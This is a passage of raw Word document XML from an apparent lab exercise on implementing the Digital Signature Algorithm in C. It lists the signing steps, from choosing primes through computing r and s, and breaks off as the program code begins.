        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">C </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s 09ebb92a1478021f08e3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>7</w:t>
      </w:r>
      <w:r>
        <w:t>a2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:t>e4ce10e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>8</w:t>
      </w:r>
      <w:r>
        <w:t>ced419f</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:hyperlink r:id="rId34">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630" w:right="715" w:hanging="4530"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Ex. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>N</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">o.: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-14"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">1                                                                                                            </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="8"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ate: D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>A</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6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680" w:bottom="280" w:left="1140" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:num="2" w:space="720" w:equalWidth="0">
            <w:col w:w="620" w:space="190"/>
            <w:col w:w="8270"/>
          </w:cols>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-17"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve">o </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>im</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>ent</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>g</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>al</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>gna</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>ure</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-13"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>gor</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>(DSA) us</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>ng C.</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Get</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>im</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>nu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ber p and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>s d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>sor q from</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>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2. Get</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>va</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ue of h from</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he 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3. Co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>pu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he va</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:t>e of g.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>4. Get</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>va</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>key xa from</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he 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5. Co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>pu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he user</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>'</w:t>
      </w:r>
      <w:r>
        <w:t>s pub</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>c key</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-16"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>6. Get</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>pe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>sage</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>secret</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>key k and hash va</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ue</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>essage M.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>7. Co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>pu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he va</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:t>e of z us</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng g, k &amp;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>p</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>8. Co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>pu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">z % q </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o get</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he v</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ue of r</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>9. Co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>pu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">he </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>ve</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nverse.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>10.Co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>pu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he va</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:t>e of s.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-10"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:t>1. Pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>gna</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>e (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-10"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>, s).</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P</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-5"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ogram Code:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>#</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ude</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>&lt;</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>o.h&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>#</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ude</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>&lt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>h.h&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>power(</w:t>
